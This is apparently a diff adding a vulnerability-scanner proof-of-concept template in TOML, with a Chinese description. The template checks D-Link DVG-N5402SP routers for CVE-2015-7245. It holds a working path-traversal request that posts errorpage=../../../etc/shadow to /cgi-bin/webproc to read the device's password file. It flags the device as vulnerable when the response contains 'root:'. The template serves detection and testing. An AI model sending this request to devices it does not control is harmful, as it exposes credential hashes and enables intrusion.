@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "D-Link DVG-N5402SP 路径遍历漏洞检测，通过 errorpage 参数读取设备任意文件"
+id = "POC-AVE-2015-0053"
+name = "CVE-2015-7245 PoC"
+severity = "high"
+tags = [
+    "cve-2015-7245",
+    "ave-2015-0053",
+]
+vuln_id = [
+    "CVE-2015-7245",
+    "AVE-2015-0053",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/webproc"
+protocol = "http"
+
+[poc.requests.body]
+content = "getpage=html%2Findex.html&errorpage=../../../../../../../../../../../etc/shadow&var%3Amenu=setup&var%3Apage=connected&obj-action=auth&%3Ausername=blah&%3Apassword=blah&%3Aaction=login&%3Asessionid=abcdefgh"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
